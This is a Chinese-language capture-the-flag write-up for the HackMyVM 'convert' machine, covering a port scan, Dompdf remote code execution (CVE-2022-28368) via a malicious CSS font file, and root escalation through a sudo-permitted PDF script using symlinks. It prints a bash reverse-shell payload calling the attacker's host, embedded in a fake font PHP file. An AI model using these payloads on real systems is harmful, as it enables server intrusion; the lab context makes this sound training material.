---
sidebar_position: 7
tags: [Easy, Linux, 命令执行, 定时任务, 逻辑漏洞, 链接文件]
title: convert
description: convert
---
import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';

# convert
## 端口扫描
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# nnmap -sTCV -p- --min-rate 1000 192.168.0.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 04:05 EDT
Nmap scan report for espo.hmv (192.168.0.102)
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 d8:7a:1e:74:a2:1a:40:74:91:1f:81:9b:05:7c:9a:f6 (ECDSA)
|_  256 28:9f:f8:ce:7b:5d:e1:a7:fa:23:c1:fe:00:ee:63:24 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: HTML to PDF
MAC Address: 08:00:27:41:DA:CC (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.92 seconds
```
## HTTP - 80
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417160748.png)
观察这个页面发现是一个接收 URL 地址的, 输入之后显示的内容是一个网页 PDF 查看 PDF 的文档属性, 发现其存在一个 RCE : [CVE-2022-28368](https://github.com/rvizx/CVE-2022-28368)

![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417161348.png)

随后按照 EXP 的信息进行尝试利用, 首先执行这个脚本文件, 该脚本会去帮我们生成一个 `.css` 和一个 `.php` 文件
> 这里不需要管这个 py 脚本的参数 URL 地址, 我们只是需要使用其提供的恶意文件

```bash
┌──(EXP)─(root㉿kali)-[~/CTF/HackerMyVM/CVE-2022-28368]
└─# python dompdf-rce.py --inject https://vuln.rvz/dev/convert-html-to-pdf?html= --dompdf https://vuln.rvz/dompdf/


                CVE-2022-28368 - Dompdf RCE PoC Exploit
                Ravindu Wickramasinghe | rvz  - @rvizx9
                https://github.com/rvizx/CVE-2022-28368


[inf]: selected ip address: 192.168.0.104
[inf]: using payload: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.104/9002 0>&1'");?>
[inf]: generating exploit.css and exploit_font.php files...
[inf]: url hash: ffc00d3e45aad9d4d73e32d98f624c20
[inf]: filename: exploitfont_normal_ffc00d3e45aad9d4d73e32d98f624c20.php
[inf]: starting http server on port 9001..
[inf]: sending the payloads..
                                                                                                                                                                 
┌──(EXP)─(root㉿kali)-[~/CTF/HackerMyVM/CVE-2022-28368]
└─# ls
README.md  dompdf-rce.py  exploit.css  exploit_font.php  requirements.txt
                                                                                                                                                                 
┌──(EXP)─(root㉿kali)-[~/CTF/HackerMyVM/CVE-2022-28368]
└─# cat exploit.css 

@font-face {
    font-family:'exploitfont';
    src:url('http://192.168.0.104:9001/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
}
                                                                                                                                                                         
┌──(EXP)─(root㉿kali)-[~/CTF/HackerMyVM/CVE-2022-28368]
└─# cat exploit_font.php 

� dum1�cmap
           `�,glyf5sc��head�Q6�6hhea��($hmtxD
loca
Tmaxp\ nameD�|8dum2�
                     -��-����
:83#5:08��_<�
             @�8�&۽
:8L��

:D

6                               s
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.104/9002 0>&1'");?>
```
随后创建一个 HTML 文件, 并在其中引入我们的 CSS 文件
```html
┌──(EXP)─(root㉿kali)-[~/CTF/HackerMyVM/CVE-2022-28368]
└─# cat a.html 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My Website</title>
    <link rel="stylesheet" href="http://192.168.0.104:9001/exploit.css">
</head>
<body>
    <!-- 这里是你的 HTML 内容 -->
</body>
</html>
```
随后创建一个 HTTP 服务器,监听 9001 端口, 随后向网站提交指定的 URL 地址
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417175224.png)
可以看到其解析的顺序, 以此进行解析并获取了我们的恶意文件, 至于其保存的文件的名称在之前使用  `dompdf-rce.py` 时已经告诉我们为`exploitfont_normal_ffc00d3e45aad9d4d73e32d98f624c20.php` 随后在本地开启监听, 并访问  `http://xxxx/dompdf/lib/fonts/exploitfont_normal_ffc00d3e45aad9d4d73e32d98f624c20.php` 就可以 获取到一个 Shell
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417175619.png)
## 后渗透
### eva --> root
首先可以发现用户可以执行一个特权命令


<Tabs>
  <TabItem value="apple" label="Command" default>
    ```bash
    (remote) eva@convert:/home/eva$ sudo -l
    Matching Defaults entries for eva on convert:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

    User eva may run the following commands on convert:
        (ALL : ALL) NOPASSWD: /usr/bin/python3 /home/eva/pdfgen.py *
    ```
    </TabItem>
    <TabItem value="orange" label="/home/eva/pdfgen.py">
```python 
from os import path
from time import time
from weasyprint import HTML, CSS
from urllib.parse import urlparse
from argparse import ArgumentParser
from logging import basicConfig, INFO, error, info, exception

def prune_log(log_file, max_size=1):
    try:
        log_size = path.getsize(log_file) / (1024 * 1024)
        if log_size > max_size:
            with open(log_file, 'w'):
                pass
            info(f"Log file pruned. Size exceeded {max_size} MB.")
            print(f"Log file pruned. Size exceeded {max_size} MB.")
    except Exception as e:
        print(f"Error pruning log file: {e}")

log_file = '/home/eva/pdf_gen.log'
prune_log(log_file)
basicConfig(level=INFO, filename=log_file, filemode='a',
            format='%(asctime)s - %(levelname)s - %(message)s')

def is_path_allowed(output_path):
    blocked_directories = ["/root", "/etc"]
    for directory in blocked_directories:
        if output_path.startswith(directory):
            return False
    return True

def url_html_to_pdf(url, output_path):
    block_schemes = ["file", "data"]
    block_hosts = ["127.0.0.1", "localhost"]
    blocked_directories = ["/root", "/etc"]

    try:
        start_time = time()

        scheme = urlparse(url).scheme
        hostname = urlparse(url).hostname

        if scheme in block_schemes:
            error(f"{scheme} scheme is Blocked")
            print(f"Error: {scheme} scheme is Blocked")
            return

        if hostname in block_hosts:
            error(f"{hostname} hostname is Blocked")
            print(f"Error: {hostname} hostname is Blocked")
            return

        if not is_path_allowed(output_path):
            error(f"Output path is not allowed in {blocked_directories} directories")
            print(f"Error: Output path is not allowed in {blocked_directories} directories")
            return

        html = HTML(url.strip())
        html.write_pdf(output_path, stylesheets=[CSS(string='@page { size: A3; margin: 1cm }')])

        end_time = time()
        elapsed_time = end_time - start_time
        info(f"PDF generated successfully at {output_path} in {elapsed_time:.2f} seconds")
        print(f"PDF generated successfully at {output_path} in {elapsed_time:.2f} seconds")

    except Exception as e:
        exception(f"Error: {e}")
        print(f"Error: {e}")

if __name__ == "__main__":
    parser = ArgumentParser(description="Convert HTML content from a URL to a PDF file.")
    parser.add_argument("-U", "--url", help="URL of the HTML content to convert", required=True)
    parser.add_argument("-O", "--out", help="Output file path for the generated PDF", default="/home/eva/output.pdf")

    args = parser.parse_args()
    url_html_to_pdf(args.url, args.out)
```
</TabItem>
</Tabs>
这个脚本的作用是将指定资源内容转换为 PDF 进行显示, 提权方式存在多种
<Tabs>
  <TabItem value="one" label="第一种提权方式: 利用链接文件" default>
首先该脚本在检测文件是否可以读取时, 检测的路径仅仅判断是否为 `/root` 和 `/etc`, 所以完全可以使用链接文件来进行操作, 但是值得注意的是, 这个路径好像只能在用户家目录中否则会报错误
```bash
(remote) eva@convert:/home/eva$ ln -sv /root/root.txt /home/eva/flag.txt
'/home/eva/flag.txt' -> '/root/root.txt'
(remote) eva@convert:/home/eva$ sudo -u root /usr/bin/python3 /home/eva/pdfgen.py -sudo -u root /usr/bin/python3 /home/eva/pdfgen.py -U /home/eva/flag.txt
PDF generated successfully at /home/eva/output.pdf in 0.06 seconds
```
  </TabItem>
  <TabItem value="two" label="第二种提权方式: 利用代码逻辑">
    如果观察代码, 可以发现仅仅只检查了输出文件的路径是否为 `/root` `/etc` 而对于输入的数据来源缺检测的也仅仅是协议, 如果直接读取也可以成功
    ![20240522000535](https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240522000535.png)
  </TabItem>
  <TabItem value="there" label="第三种提权方式: 修改原文件">
    对应的脚本文件存储在用户家目录中, 所以可以删除原本的文件进行重写, 从下面可以看到原本的文件被删除了
    ![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417181342.png)
  </TabItem>
</Tabs>